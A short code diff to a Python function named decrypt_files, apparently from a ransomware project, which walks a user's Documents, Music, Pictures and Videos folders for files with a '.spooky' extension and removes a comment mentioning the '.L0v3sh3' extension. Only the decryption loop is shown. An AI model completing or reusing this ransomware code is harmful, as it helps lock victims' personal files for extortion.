@@ -79,8 +79,7 @@ def decrypt_files():
     username = os.environ.get('USER')
     directories = [f'/home/{username}/testfiles',f'/home/{username}/Documents',f'/home/{username}/Music',f'/home/{username}/Pictures',f'/home/{username}/Videos']
 
-    # because we need to decrypt file focus on .L0v3sh3 extension here is the code
-    includeExtension = ['.spooky'] # CHANGE THIS make sure all is lower case
+    includeExtension = ['.spooky'] 
     try:
         for directory in directories:
             for item in scanRecurse(directory): 
